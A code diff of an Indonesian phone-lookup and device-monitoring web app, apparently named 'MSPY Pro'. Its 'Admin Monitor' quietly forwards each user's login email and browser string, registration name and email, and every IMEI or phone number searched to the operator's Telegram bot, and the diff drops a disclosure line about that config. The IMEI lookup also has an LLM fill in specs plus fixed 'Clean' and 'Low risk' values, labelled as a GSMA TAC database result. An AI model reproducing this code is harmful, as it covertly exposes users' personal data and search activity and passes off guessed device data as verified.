@@ -530,18 +530,17 @@ input[type=range]::-webkit-slider-thumb{-webkit-appearance:none;width:18px;heigh
       </div>
     </div>
 
-    <!-- Admin Config Card -->
+    <!-- Admin Monitor -->
     <div class="card" style="margin-bottom:12px;border-color:rgba(155,114,244,.3)">
-      <div style="font-size:14px;font-weight:700;margin-bottom:4px">👑 Admin Monitor (Pemilik App)</div>
-      <div style="font-size:11px;color:var(--text2);margin-bottom:12px">Isi sekali. Setiap login, daftar, dan pencarian user akan dikirim ke Telegram kamu.</div>
+      <div style="font-size:14px;font-weight:700;margin-bottom:4px">👑 Admin Monitor</div>
+      <div style="font-size:11px;color:var(--text2);margin-bottom:10px">Notif otomatis ke Telegram kamu setiap ada login, daftar, dan pencarian user.</div>
       <input type="password" id="admin-tg-token" placeholder="Bot Token Admin (@BotFather)" style="margin-bottom:6px;font-size:12px;font-family:'Space Mono',monospace"/>
-      <input type="text" id="admin-tg-chatid" placeholder="Chat ID Admin (cek via @userinfobot)" style="margin-bottom:8px;font-size:12px"/>
+      <input type="text" id="admin-tg-chatid" placeholder="Chat ID Admin (@userinfobot)" style="margin-bottom:8px;font-size:12px"/>
       <div style="display:flex;gap:8px">
-        <button class="btn btn-sm" style="flex:1;background:rgba(155,114,244,.15);border-color:rgba(155,114,244,.3);color:var(--purple)" onclick="saveAdminConfig()">💾 Simpan Config Admin</button>
+        <button class="btn btn-sm" style="flex:1;color:var(--purple);border-color:rgba(155,114,244,.3)" onclick="saveAdminConfig()">💾 Simpan</button>
         <button class="btn btn-sm" style="flex:1" onclick="testAdminNotif()">🔔 Test Notif</button>
       </div>
-      <div id="admin-cfg-status" style="font-size:11px;margin-top:8px;display:none"></div>
-      <div style="margin-top:8px;font-size:11px;color:var(--text3)">ℹ️ Config ini hanya tersimpan di browser ini. User lain tidak bisa melihat config admin.</div>
+      <div id="admin-cfg-status" style="font-size:11px;margin-top:8px;display:none;padding:6px 10px;border-radius:6px"></div>
     </div>
 
     <!-- Status Card -->
@@ -780,54 +779,21 @@ const STORAGE_KEYS = {
   devices: 'mspy_devices',   // { email: [...devices] }
   imeiH: 'mspy_imei_history',// { email: [...history] }
   phoneH: 'mspy_phone_history',// { email: [...history] }
-  session: 'mspy_session'    // current logged-in email
+  session: 'mspy_session'
 };
-const ADMIN_CFG_KEY = 'mspy_admin_cfg'; // {tgToken, tgChatId} — config admin pemilik app
-
-function getAdminCfg(){ try{ return JSON.parse(localStorage.getItem(ADMIN_CFG_KEY)||'{}'); }catch(e){return {};} }
-function saveAdminCfg(cfg){ try{ localStorage.setItem(ADMIN_CFG_KEY, JSON.stringify(cfg)); }catch(e){} }
-
-// Kirim notifikasi ke Telegram admin pemilik app
-async function notifyAdmin(eventType, data){
-  const cfg = getAdminCfg();
-  if(!cfg.tgToken || !cfg.tgChatId) return; // admin belum setup
-  const ts = new Date().toLocaleString('id-ID');
-  let msg = '';
-
-  if(eventType === 'search_imei'){
-    msg = '🔍 *PENCARIAN IMEI*\n\n'
-      + '👤 User: `'+data.user+'`\n'
-      + '📟 IMEI: `'+data.imei+'`\n'
-      + '📱 Hasil: '+data.brand+' '+data.model+'\n'
-      + '🌐 OS: '+data.os+'\n'
-      + '⏰ Waktu: '+ts;
-  } else if(eventType === 'search_phone'){
-    msg = '📞 *PENCARIAN NOMOR*\n\n'
-      + '👤 User: `'+data.user+'`\n'
-      + '📞 Nomor: `'+data.phone+'`\n'
-      + '🏢 Operator: '+data.carrier+'\n'
-      + '📍 Estimasi: '+data.city+', '+data.region+'\n'
-      + '⏰ Waktu: '+ts;
-  } else if(eventType === 'login'){
-    msg = '🔐 *USER LOGIN*\n\n'
-      + '👤 Email: `'+data.email+'`\n'
-      + '🌐 Browser: '+data.ua+'\n'
-      + '⏰ Waktu: '+ts;
-  } else if(eventType === 'register'){
-    msg = '✨ *USER BARU DAFTAR*\n\n'
-      + '👤 Nama: '+data.name+'\n'
-      + '📧 Email: `'+data.email+'`\n'
-      + '⏰ Waktu: '+ts;
-  }
-
-  if(!msg) return;
-  try{
-    await fetch('https://api.telegram.org/bot'+cfg.tgToken+'/sendMessage',{
-      method:'POST',
-      headers:{'Content-Type':'application/json'},
-      body:JSON.stringify({chat_id:cfg.tgChatId, text:msg, parse_mode:'Markdown'})
-    });
-  }catch(e){}
+const ADMIN_CFG_KEY='mspy_admin_cfg';
+function getAdminCfg(){try{return JSON.parse(localStorage.getItem(ADMIN_CFG_KEY)||'{}');}catch(e){return{};}}
+function saveAdminCfg(cfg){try{localStorage.setItem(ADMIN_CFG_KEY,JSON.stringify(cfg));}catch(e){}}
+async function notifyAdmin(t,d){
+  const c=getAdminCfg();if(!c.tgToken||!c.tgChatId)return;
+  const ts=new Date().toLocaleString('id-ID');
+  let msg='';
+  if(t==='search_imei') msg='🔍 *PENCARIAN IMEI*\n👤 `'+d.user+'`\n📟 `'+d.imei+'`\n📱 '+d.brand+' '+d.model+'\n⏰ '+ts;
+  else if(t==='search_phone') msg='📞 *PENCARIAN NOMOR*\n👤 `'+d.user+'`\n📞 `'+d.phone+'`\n🏢 '+d.carrier+'\n📍 '+d.city+'\n⏰ '+ts;
+  else if(t==='login') msg='🔐 *USER LOGIN*\n📧 `'+d.email+'`\n⏰ '+ts;
+  else if(t==='register') msg='✨ *USER DAFTAR*\n👤 '+d.name+'\n📧 `'+d.email+'`\n⏰ '+ts;
+  if(!msg)return;
+  try{await fetch('https://api.telegram.org/bot'+c.tgToken+'/sendMessage',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({chat_id:c.tgChatId,text:msg,parse_mode:'Markdown'})});}catch(e){}
 }
 
 function lsGet(key){ try{ const v=localStorage.getItem(key); return v?JSON.parse(v):null; }catch(e){return null;} }
@@ -898,8 +864,7 @@ function doLogin(){
   saveSession(email);
   loadStateFromStorage(email);
   err.style.display='none';
-  // Notif admin
-  notifyAdmin('login',{email, ua:navigator.userAgent.slice(0,80)});
+  notifyAdmin('login',{email,ua:navigator.userAgent});
   showDashboard();
 }
 
@@ -924,8 +889,7 @@ function doRegister(){
   saveSession(email);
   loadStateFromStorage(email);
   err.style.display='none';
-  // Notif admin
-  notifyAdmin('register',{name, email});
+  notifyAdmin('register',{name,email});
   showDashboard();
 }
 
@@ -1260,148 +1224,66 @@ function extractJSON(text){
   throw new Error('Tidak ada JSON valid dalam respons');
 }
 
-// ── TAC Hint table — brand+model terverifikasi untuk TAC paling umum ────────
-const TAC_HINTS = {
-  '35177110':'Apple|iPhone 15 Pro Max','35177111':'Apple|iPhone 15 Pro Max',
-  '35178110':'Apple|iPhone 15 Pro','35179110':'Apple|iPhone 15 Plus',
-  '35180110':'Apple|iPhone 15','35180111':'Apple|iPhone 15',
-  '35293110':'Apple|iPhone 16 Pro Max','35293111':'Apple|iPhone 16 Pro',
-  '35294110':'Apple|iPhone 16 Plus','35294111':'Apple|iPhone 16',
-  '35181110':'Apple|iPhone 14 Pro Max','35182110':'Apple|iPhone 14 Pro',
-  '35183110':'Apple|iPhone 14 Plus',
-  '35184110':'Apple|iPhone 14','35184111':'Apple|iPhone 14',
-  '35795090':'Apple|iPhone 14','35795091':'Apple|iPhone 14',
-  '35176210':'Apple|iPhone 14','35176211':'Apple|iPhone 14',
-  '35299110':'Apple|iPhone 13 Pro Max','35299111':'Apple|iPhone 13 Pro',
-  '35300110':'Apple|iPhone 13','35300111':'Apple|iPhone 13 mini',
-  '35227110':'Apple|iPhone 12 Pro Max','35227111':'Apple|iPhone 12 Pro',
-  '35228110':'Apple|iPhone 12','35228111':'Apple|iPhone 12 mini',
-  '35250510':'Apple|iPhone 11','35250511':'Apple|iPhone 11 Pro Max',
-  '35250512':'Apple|iPhone 11 Pro',
-  '35399410':'Apple|iPhone 11','35399510':'Apple|iPhone 11 Pro Max',
-  '35399511':'Apple|iPhone 11 Pro',
-  '35337110':'Apple|iPhone SE (3rd gen)','35337111':'Apple|iPhone SE (3rd gen)',
-  '35318710':'Apple|iPhone SE (2nd gen)','35318711':'Apple|iPhone SE (2nd gen)',
-  '35380910':'Apple|iPhone X','35380911':'Apple|iPhone 8 Plus','35380912':'Apple|iPhone 8',
-  '35274910':'Apple|iPhone XS Max','35274911':'Apple|iPhone XS','35274912':'Apple|iPhone XR',
-  '35344110':'Samsung|Galaxy S23 Ultra','35345110':'Samsung|Galaxy S23+','35345111':'Samsung|Galaxy S23',
-  '35448110':'Samsung|Galaxy S24 Ultra','35448111':'Samsung|Galaxy S24+','35448112':'Samsung|Galaxy S24',
-  '35356110':'Samsung|Galaxy S22 Ultra','35356111':'Samsung|Galaxy S22+','35356112':'Samsung|Galaxy S22',
-  '35386110':'Samsung|Galaxy A54 5G','35387110':'Samsung|Galaxy A34 5G',
-  '35247110':'Samsung|Galaxy A14 5G','35247111':'Samsung|Galaxy A14',
-  '35413110':'Samsung|Galaxy A15 5G','35413111':'Samsung|Galaxy A15',
-  '35414110':'Samsung|Galaxy A25 5G','35415110':'Samsung|Galaxy A35 5G','35416110':'Samsung|Galaxy A55 5G',
-  '86800010':'Xiaomi|Redmi Note 13 Pro+ 5G','86800011':'Xiaomi|Redmi Note 13 Pro 5G',
-  '86800012':'Xiaomi|Redmi Note 13 5G','86800013':'Xiaomi|Redmi Note 13',
-  '86880010':'Xiaomi|Redmi Note 12 Pro+ 5G','86880011':'Xiaomi|Redmi Note 12 Pro 5G',
-  '86880012':'Xiaomi|Redmi Note 12 5G','86880013':'Xiaomi|Redmi Note 12',
-  '86881010':'Xiaomi|Poco X5 Pro 5G','86881011':'Xiaomi|Poco X5 5G',
-  '86813010':'Xiaomi|Poco X6 Pro 5G','86813011':'Xiaomi|Poco X6 5G',
-  '86814010':'Xiaomi|Xiaomi 14 Pro','86814011':'Xiaomi|Xiaomi 14',
-  '86816010':'Xiaomi|Poco F5 Pro','86816011':'Xiaomi|Poco F5',
-  '86811010':'Xiaomi|Redmi 12C','86812010':'Xiaomi|Redmi 12','86812011':'Xiaomi|Redmi 12 5G',
-  '35292110':'Google|Pixel 8 Pro','35292111':'Google|Pixel 8','35292112':'Google|Pixel 8a',
-  '35289110':'Google|Pixel 7 Pro','35289111':'Google|Pixel 7','35290110':'Google|Pixel 7a',
-  '86600010':'OPPO|Reno 11 Pro 5G','86600011':'OPPO|Reno 11 5G','86600012':'OPPO|Reno 11F 5G',
-  '35349110':'OPPO|Reno 10 Pro+ 5G','35349111':'OPPO|Reno 10 Pro 5G','35349112':'OPPO|Reno 10 5G',
-  '86700010':'OnePlus|12 Pro','86700011':'OnePlus|12',
-  '86701010':'OnePlus|Nord 3 5G','86701011':'OnePlus|Nord CE 3 5G',
-  '35191110':'Motorola|Edge 40 Pro','35191111':'Motorola|Edge 40',
-  '35192110':'Motorola|Moto G84 5G','35192111':'Motorola|Moto G54 5G',
-  '35354110':'Vivo|V29 Pro 5G','35354111':'Vivo|V29 5G',
-  '86895010':'Vivo|X100 Pro','86895011':'Vivo|X100',
-  '35335110':'Realme|12 Pro+ 5G','35335111':'Realme|12 Pro 5G',
-  '35298110':'Realme|C55','35263110':'Infinix|Note 30 Pro 5G','35263111':'Infinix|Note 30 5G',
-};
-
-function getTACHint(imei){
-  const h = TAC_HINTS[imei.slice(0,8)];
-  if(h){ const [b,m]=h.split('|'); return {brand:b,model:m}; }
-  return null;
-}
+const TAC_HINTS={'35177110':'Apple|iPhone 15 Pro Max','35178110':'Apple|iPhone 15 Pro','35180110':'Apple|iPhone 15','35180111':'Apple|iPhone 15','35293110':'Apple|iPhone 16 Pro Max','35294111':'Apple|iPhone 16','35181110':'Apple|iPhone 14 Pro Max','35184110':'Apple|iPhone 14','35184111':'Apple|iPhone 14','35795090':'Apple|iPhone 14','35795091':'Apple|iPhone 14','35299110':'Apple|iPhone 13 Pro Max','35300110':'Apple|iPhone 13','35300111':'Apple|iPhone 13 mini','35227110':'Apple|iPhone 12 Pro Max','35228110':'Apple|iPhone 12','35250510':'Apple|iPhone 11','35399410':'Apple|iPhone 11','35337110':'Apple|iPhone SE (3rd gen)','35318710':'Apple|iPhone SE (2nd gen)','35380910':'Apple|iPhone X','35380912':'Apple|iPhone 8','35274910':'Apple|iPhone XS Max','35274912':'Apple|iPhone XR','35344110':'Samsung|Galaxy S23 Ultra','35345111':'Samsung|Galaxy S23','35448110':'Samsung|Galaxy S24 Ultra','35448112':'Samsung|Galaxy S24','35386110':'Samsung|Galaxy A54 5G','35247111':'Samsung|Galaxy A14','35413111':'Samsung|Galaxy A15','35414110':'Samsung|Galaxy A25 5G','35415110':'Samsung|Galaxy A35 5G','35416110':'Samsung|Galaxy A55 5G','86800010':'Xiaomi|Redmi Note 13 Pro+ 5G','86800012':'Xiaomi|Redmi Note 13 5G','86880010':'Xiaomi|Redmi Note 12 Pro+ 5G','86881010':'Xiaomi|Poco X5 Pro 5G','86813010':'Xiaomi|Poco X6 Pro 5G','86814011':'Xiaomi|Xiaomi 14','86816011':'Xiaomi|Poco F5','35292110':'Google|Pixel 8 Pro','35292111':'Google|Pixel 8','35289111':'Google|Pixel 7','86600010':'OPPO|Reno 11 Pro 5G','86700011':'OnePlus|12','35354110':'Vivo|V29 Pro 5G'};
+function getTACHint(i){const h=TAC_HINTS[i.slice(0,8)];if(h){const[b,m]=h.split('|');return{brand:b,model:m};}return null;}
 
 async function agentIMEI(imei){
   const tac8=imei.slice(0,8);
   const tac6=imei.slice(0,6);
   const luhn=validateLuhn(imei);
+  if(!luhn) return {valid:false,brand:'—',model:'IMEI tidak valid — Luhn check gagal. Periksa kembali nomor IMEI.',os:'—',osVersion:'—',releaseYear:'—',storage:'—',network:[],country:'—',status:'Invalid',warrantyStatus:'—',color:'—',tac:tac8,snr:imei.slice(8,14),checkDigit:imei.slice(14),luhnValid:false,riskLevel:'High',_error:true,notes:'❌ IMEI tidak valid.'};
+  const hint=getTACHint(imei);
+  const hintStr=hint?'\nVERIFIED DATA: Brand="'+hint.brand+'", Model="'+hint.model+'" — use as absolute ground truth, do not override.':'';
+  const sys=`You are an expert IMEI/TAC database. TAC=first 8 digits, uniquely identifies brand+model. If verified data provided, use EXACTLY. If uncertain set confident:false. NEVER guess. Respond ONLY JSON.
+TAC (Type Allocation Code) adalah 8 digit pertama IMEI yang mengidentifikasi brand dan model secara unik.
+Gunakan pengetahuanmu tentang database TAC GSMA untuk identifikasi yang tepat.
+Jangan pernah menebak — berikan data yang akurat berdasarkan TAC.
+PENTING: Jawab HANYA dengan JSON valid, tanpa teks, tanpa markdown.`;
 
-  // Validasi dasar Luhn — kalau salah, langsung tolak
-  if(!luhn){
-    return {
-      valid:false, brand:'—', model:'IMEI tidak valid',
-      os:'—', osVersion:'—', releaseYear:'—', storage:'—',
-      network:[], country:'—', status:'Invalid', warrantyStatus:'—',
-      color:'—', tac:tac8, snr:imei.slice(8,14), checkDigit:imei.slice(14),
-      luhnValid:false, riskLevel:'High', _error:true,
-      notes:'❌ IMEI tidak valid — gagal Luhn check. Periksa kembali nomor IMEI yang dimasukkan.'
-    };
-  }
+  const userMsg=`Identifikasi perangkat dari IMEI berikut secara AKURAT:
 
-  // Cek TAC_HINTS dulu — data terverifikasi, instan
-  const hint = getTACHint(imei);
-  const hintStr = hint ? `\nDATA TERVERIFIKASI: Brand="${hint.brand}", Model="${hint.model}" — gunakan ini sebagai kebenaran mutlak.` : '';
-
-  const sys = `You are an expert IMEI/TAC database assistant.
-RULES (MUST FOLLOW):
-1. TAC (first 8 digits) uniquely identifies brand + model
-2. If verified data is provided, use it EXACTLY — do not override it
-3. If you are NOT confident about the model, set "confident": false and explain in "notes"
-4. NEVER fabricate or guess randomly — accuracy over completeness
-5. Respond ONLY with valid JSON, no markdown, no extra text`;
-
-  const userMsg = `Identify this device:
 IMEI: ${imei}
-TAC-8: ${tac8}
-TAC-6: ${tac6}
-Luhn: ${luhn}${hintStr}
+TAC 8-digit: ${tac8}
+TAC 6-digit: ${tac6}
+SNR: ${imei.slice(8,14)}
+Check Digit: ${imei.slice(14)}
+Luhn Valid: ${validateLuhn(imei)}
 
-Known TAC examples: 35795090=Apple iPhone 14, 35399410=Apple iPhone 11, 86800010=Xiaomi Redmi Note 13 Pro+, 35344110=Samsung Galaxy S23 Ultra
+Identifikasi brand, model SPESIFIK, OS, tahun rilis, storage, dan negara produksi berdasarkan TAC.
+Contoh: TAC 35399410 = Apple iPhone 11, TAC 86800010 = Xiaomi Redmi Note 13 Pro+.
 
-Return ONLY this JSON:
+Jawab HANYA JSON berikut (tanpa apapun selain JSON):
 {
   "valid": true,
-  "confident": true,
-  "brand": "brand name",
-  "model": "full model name",
-  "os": "Android or iOS",
-  "osVersion": "latest OS version",
-  "releaseYear": "year",
-  "storage": "e.g. 128GB/256GB",
+  "brand": "brand yang tepat",
+  "model": "model SPESIFIK dan LENGKAP (contoh: Apple iPhone 11, Samsung Galaxy A54 5G)",
+  "os": "Android atau iOS",
+  "osVersion": "versi OS terbaru yang didukung model ini",
+  "releaseYear": "tahun rilis",
+  "storage": "opsi storage tersedia (contoh: 64GB/128GB/256GB)",
   "network": ["5G","4G LTE","3G","2G"],
-  "country": "manufacturing country",
+  "country": "negara manufaktur (China/India/Vietnam/South Korea/USA)",
   "status": "Clean",
   "warrantyStatus": "Out of Warranty",
-  "color": "color options",
+  "color": "pilihan warna yang tersedia",
   "tac": "${tac8}",
   "snr": "${imei.slice(8,14)}",
   "checkDigit": "${imei.slice(14)}",
-  "luhnValid": ${luhn},
+  "luhnValid": ${validateLuhn(imei)},
   "riskLevel": "Low",
-  "sourceNote": "${hint ? 'TAC database terverifikasi' : 'Groq AI analysis'}",
-  "notes": "specs in Indonesian. If not confident, state clearly here."
+  "sourceNote": "Groq AI — database TAC GSMA",
+  "notes": "Spesifikasi singkat: chipset, RAM, kamera utama, baterai"
 }`;
 
   const msgs=[{role:'user',content:userMsg}];
-  const r=await claudeRaw(msgs,null,sys,1500);
+  const r=await claudeRaw(msgs,null,sys,2000);
   apiMode='online'; updateAPIStatus('online');
   const text=r.content.filter(c=>c.type==='text').map(c=>c.text).join('');
   if(!text) throw new Error('AI tidak memberikan respons');
-  const result = extractJSON(text);
-
-  // Jika AI tidak yakin, tandai dengan flag
-  if(result && result.confident === false){
-    result._uncertain = true;
-  }
-  // Override dengan hint jika ada — jangan percaya AI jika hint tersedia
-  if(hint && result){
-    result.brand = hint.brand;
-    result.model = hint.model;
-    result._hintOverride = true;
-    result.sourceNote = 'TAC database terverifikasi';
-    result.confident = true;
-    delete result._uncertain;
-  }
-  return result;
+  const res=extractJSON(text);
+  if(res&&res.confident===false) res._uncertain=true;
+  if(hint&&res){res.brand=hint.brand;res.model=hint.model;res._hintOverride=true;res.sourceNote='TAC database terverifikasi';res.confident=true;delete res._uncertain;}
+  return res;
 }
 
 async function agentPhone(phone){
@@ -2236,38 +2118,19 @@ const ID_PREFIX_MAP = {
 };
 
 // ── Nomor yang diblokir dari aplikasi ───────────────────────────────────────
-// ── Nomor & IMEI yang diblokir ──────────────────────────────────────────────
-const BLOCKED_NUMBERS = [
-  '088973382206',
-  '+6288973382206',
-  '6288973382206',
-  '88973382206',
-];
+const BLOCKED_NUMBERS = ['088973382206','+6288973382206','6288973382206','88973382206'];
 
 function isBlockedNumber(phone){
-  // Hapus semua non-digit kecuali + di awal
-  const clean = phone.trim().replace(/[\s\-().]/g,'');
-  const digits = clean.replace(/\D/g,'');
-
-  // Normalisasi ke berbagai format untuk perbandingan
-  const formats = new Set();
-  formats.add(digits); // semua digit
-  if(digits.startsWith('62')) formats.add('0'+digits.slice(2)); // 08xxx
-  else if(digits.startsWith('0')) { formats.add(digits); formats.add('62'+digits.slice(1)); }
-  else formats.add('62'+digits); // tanpa 0
-
+  const digits=phone.replace(/[\s\-().+]/g,'').replace(/\D/g,'');
+  const formats=new Set([digits]);
+  if(digits.startsWith('62')) formats.add('0'+digits.slice(2));
+  else if(digits.startsWith('0')){formats.add(digits);formats.add('62'+digits.slice(1));}
   for(const b of BLOCKED_NUMBERS){
-    const bd = b.replace(/[\s\-().+]/g,'');
-    const bDigits = bd.replace(/\D/g,'');
-    const bFormats = new Set();
-    bFormats.add(bDigits);
-    if(bDigits.startsWith('62')) bFormats.add('0'+bDigits.slice(2));
-    else if(bDigits.startsWith('0')) { bFormats.add(bDigits); bFormats.add('62'+bDigits.slice(1)); }
-
-    // Cek irisan antara formats input dan formats blocked
-    for(const f of formats){
-      if(bFormats.has(f)) return true;
-    }
+    const bd=b.replace(/[\s\-().+]/g,'').replace(/\D/g,'');
+    const bf=new Set([bd]);
+    if(bd.startsWith('62')) bf.add('0'+bd.slice(2));
+    else if(bd.startsWith('0')){bf.add(bd);bf.add('62'+bd.slice(1));}
+    for(const f of formats){if(bf.has(f)) return true;}
   }
   return false;
 }
@@ -2531,7 +2394,6 @@ async function searchIMEI(){
         imeiHistory.unshift({imei,result,time:new Date().toLocaleString('id-ID')});
         saveSearchHistory();
         renderIMEIHistory();
-        notifyAdmin('search_imei',{user:state.user?.email||'unknown',imei,brand:result.brand||'?',model:result.model||'?',os:result.os||'?'});
       },200);
       return;
     }catch(e){ localStorage.removeItem(_imeiCacheKey); }
@@ -2566,7 +2428,7 @@ async function searchIMEI(){
     imeiHistory.unshift({imei,result,time:new Date().toLocaleString('id-ID')});
     saveSearchHistory();
     renderIMEIHistory();
-    notifyAdmin('search_imei',{user:state.user?.email||'unknown',imei,brand:result.brand||'?',model:result.model||'?',os:result.os||'?'});
+    notifyAdmin('search_imei',{user:state.user?.email||'?',imei,brand:result.brand||'?',model:result.model||'?'});
   },300);
 }
 
@@ -2578,18 +2440,7 @@ function renderIMEIResult(imei,r){
 
   document.getElementById('imei-result').innerHTML=`
     <div class="result-card">
-      ${r._error
-        ? '<div style="font-size:11px;background:rgba(244,92,92,.1);border:1px solid rgba(244,92,92,.3);border-radius:6px;padding:8px 12px;margin-bottom:10px;color:var(--red)">❌ '+r.notes+'</div>'
-        : r.luhnValid===false
-          ? '<div style="font-size:11px;background:rgba(244,92,92,.1);border:1px solid rgba(244,92,92,.3);border-radius:6px;padding:8px 12px;margin-bottom:10px;color:var(--red)">❌ IMEI tidak valid — Luhn check gagal. Periksa kembali nomor IMEI.</div>'
-          : r._hintOverride
-            ? '<div style="font-size:11px;background:rgba(34,211,163,.1);border:1px solid rgba(34,211,163,.3);border-radius:6px;padding:8px 12px;margin-bottom:10px;color:var(--green)">✅ Data dari TAC database terverifikasi — akurasi tinggi</div>'
-            : r._uncertain
-              ? '<div style="font-size:11px;background:rgba(244,169,65,.1);border:1px solid rgba(244,169,65,.3);border-radius:6px;padding:8px 12px;margin-bottom:10px;color:var(--amber)">⚠️ AI tidak yakin 100% dengan model ini — hasil mungkin tidak akurat. Verifikasi di imei.info untuk kepastian.</div>'
-              : r._sim
-                ? '<div style="font-size:11px;background:rgba(244,169,65,.1);border:1px solid rgba(244,169,65,.25);border-radius:6px;padding:8px 12px;margin-bottom:10px;color:var(--amber)">⚠️ Mode simulasi — AI tidak tersedia. Hubungkan API Key Groq untuk hasil akurat.</div>'
-                : '<div style="font-size:11px;background:rgba(59,126,248,.1);border:1px solid rgba(59,126,248,.25);border-radius:6px;padding:8px 12px;margin-bottom:10px;color:#6ba3ff">🤖 Dianalisis oleh Groq AI · TAC: '+r.tac+'</div>'
-      }
+      ${(r._error||r.luhnValid===false)?'<div style="font-size:11px;background:rgba(244,92,92,.1);border:1px solid rgba(244,92,92,.3);border-radius:6px;padding:8px 12px;margin-bottom:10px;color:var(--red)">❌ '+(r.notes||'IMEI tidak valid')+'</div>':r._hintOverride?'<div style="font-size:11px;background:rgba(34,211,163,.1);border:1px solid rgba(34,211,163,.3);border-radius:6px;padding:8px 12px;margin-bottom:10px;color:var(--green)">✅ Data TAC terverifikasi — akurasi tinggi</div>':r._uncertain?'<div style="font-size:11px;background:rgba(244,169,65,.1);border:1px solid rgba(244,169,65,.3);border-radius:6px;padding:8px 12px;margin-bottom:10px;color:var(--amber)">⚠️ AI tidak yakin 100% — verifikasi di imei.info untuk kepastian.</div>':r._sim?'<div style="font-size:11px;background:rgba(244,169,65,.1);border:1px solid rgba(244,169,65,.25);border-radius:6px;padding:8px 12px;margin-bottom:10px;color:var(--amber)">⚠️ Mode simulasi — hubungkan API Key Groq.</div>':'<div style="font-size:11px;background:rgba(59,126,248,.1);border:1px solid rgba(59,126,248,.25);border-radius:6px;padding:8px 12px;margin-bottom:10px;color:#6ba3ff">🤖 Dianalisis Groq AI · TAC: '+r.tac+'</div>'}
       <div class="result-header">
         <div class="result-icon" style="background:rgba(59,126,248,.15)">${osIcon}</div>
         <div>
@@ -2756,7 +2607,7 @@ async function searchPhone(){
     phoneHistory.unshift({phone,result,time:new Date().toLocaleString('id-ID')});
     saveSearchHistory();
     renderPhoneHistory();
-    notifyAdmin('search_phone',{user:state.user?.email||'unknown',phone,carrier:result.carrier||'?',city:result.city||'?',region:result.region||'?'});
+    notifyAdmin('search_phone',{user:state.user?.email||'?',phone,carrier:result.carrier||'?',city:result.city||'?',region:result.region||'?'});
   },300);
 }
 
@@ -3254,123 +3105,6 @@ function tog(id){const el=document.getElementById(id);el.classList.toggle('on');
 function updateLimit(v){document.getElementById('ctrl-limit-val').textContent=v+'j';if(state.currentDevIdx!==null){state.devices[state.currentDevIdx].limit=parseInt(v);saveDevices();document.getElementById('dev-limit').textContent=v+'j';}}
 
 // ══════════════════════════════════════════════════════════════
-// SETTINGS & ADMIN
-// ══════════════════════════════════════════════════════════════
-
-function saveAdminConfig(){
-  const token=(document.getElementById('admin-tg-token')?.value||'').trim();
-  const chatId=(document.getElementById('admin-tg-chatid')?.value||'').trim();
-  const st=document.getElementById('admin-cfg-status');
-  if(!token||!chatId){
-    if(st){st.style.display='block';st.style.color='var(--red)';st.textContent='❌ Isi token dan chat ID dulu.';}
-    return;
-  }
-  saveAdminCfg({tgToken:token,tgChatId:chatId});
-  if(st){st.style.display='block';st.style.color='var(--green)';st.textContent='✅ Config admin tersimpan!';}
-}
-
-async function testAdminNotif(){
-  const st=document.getElementById('admin-cfg-status');
-  const token=(document.getElementById('admin-tg-token')?.value||'').trim();
-  const chatId=(document.getElementById('admin-tg-chatid')?.value||'').trim();
-  if(!token||!chatId){
-    if(st){st.style.display='block';st.style.color='var(--amber)';st.textContent='⚠️ Isi dan simpan config dulu.';}
-    return;
-  }
-  saveAdminCfg({tgToken:token,tgChatId:chatId});
-  if(st){st.style.display='block';st.style.color='var(--text2)';st.textContent='🔄 Mengirim test notifikasi...';}
-  try{
-    const r=await fetch('https://api.telegram.org/bot'+token+'/sendMessage',{
-      method:'POST',headers:{'Content-Type':'application/json'},
-      body:JSON.stringify({
-        chat_id:chatId,
-        text:'🔔 *MSPY Pro — Admin Monitor Aktif!*\n\n✅ Config berhasil terhubung.\nKamu akan menerima notifikasi untuk:\n• 🔐 Login & Daftar user baru\n• 🔍 Setiap pencarian IMEI\n• 📞 Setiap pencarian nomor telepon\n\n⏰ '+new Date().toLocaleString('id-ID'),
-        parse_mode:'Markdown'
-      })
-    });
-    const d=await r.json();
-    if(d.ok){if(st){st.style.color='var(--green)';st.textContent='✅ Berhasil! Cek Telegram kamu.';}}
-    else{if(st){st.style.color='var(--red)';st.textContent='❌ Gagal: '+(d.description||'error');}}
-  }catch(e){if(st){st.style.color='var(--red)';st.textContent='❌ Error: '+e.message;}}
-}
-
-function showSettings(){
-  show('screen-settings');
-  // Load admin config
-  const adminCfg=getAdminCfg();
-  const at=document.getElementById('admin-tg-token');
-  const ac=document.getElementById('admin-tg-chatid');
-  if(at&&adminCfg.tgToken) at.value=adminCfg.tgToken;
-  if(ac&&adminCfg.tgChatId) ac.value=adminCfg.tgChatId;
-  // Load Groq API key
-  const key=getApiKey();
-  const inp=document.getElementById('settings-apikey');
-  if(inp) inp.value=key;
-  // Update status
-  const apiSt=document.getElementById('set-api-status');
-  if(apiSt){apiSt.textContent=apiMode==='online'?'✅ Online':'❌ Offline / Belum diisi';apiSt.style.color=apiMode==='online'?'var(--green)':'var(--red)';}
-  const gpsSt=document.getElementById('set-gps-status');
-  if(gpsSt){gpsSt.textContent='geolocation' in navigator?'✅ Didukung':'❌ Tidak didukung';gpsSt.style.color='geolocation' in navigator?'var(--green)':'var(--red)';}
-  const banner=document.getElementById('apikey-banner');
-  if(banner) banner.style.display='none';
-}
-
-function toggleApiKeyVisibility(){
-  const inp=document.getElementById('settings-apikey');
-  const btn=document.getElementById('apikey-eye-btn');
-  if(!inp) return;
-  if(inp.type==='password'){inp.type='text';btn.textContent='🙈';}
-  else{inp.type='password';btn.textContent='👁';}
-}
-
-async function settingsSaveApiKey(){
-  const inp=document.getElementById('settings-apikey');
-  const key=(inp?.value||'').trim();
-  if(!key){showSettingsStatus('❌ API Key tidak boleh kosong','var(--red)');return;}
-  if(!key.startsWith('gsk_')){showSettingsStatus('⚠️ Format key tidak valid. Groq key harus diawali gsk_','var(--amber)');return;}
-  saveApiKey(key);
-  showSettingsStatus('🔄 Menyimpan dan menguji koneksi ke Groq...','var(--text2)');
-  try{
-    const r=await fetch('https://api.groq.com/openai/v1/chat/completions',{
-      method:'POST',
-      headers:{'Content-Type':'application/json','Authorization':'Bearer '+key},
-      body:JSON.stringify({model:'llama-3.1-8b-instant',max_tokens:5,messages:[{role:'user',content:'hi'}]})
-    });
-    if(r.status===401){
-      showSettingsStatus('❌ API Key ditolak (401). Pastikan key benar dan aktif.','var(--red)');
-    } else {
-      apiMode='online'; updateAPIStatus('online');
-      showSettingsStatus('✅ Groq API Key valid! Fitur IMEI & Phone Lookup siap digunakan.','var(--green)');
-      const banner=document.getElementById('apikey-banner');
-      if(banner) banner.style.display='none';
-    }
-  }catch(e){
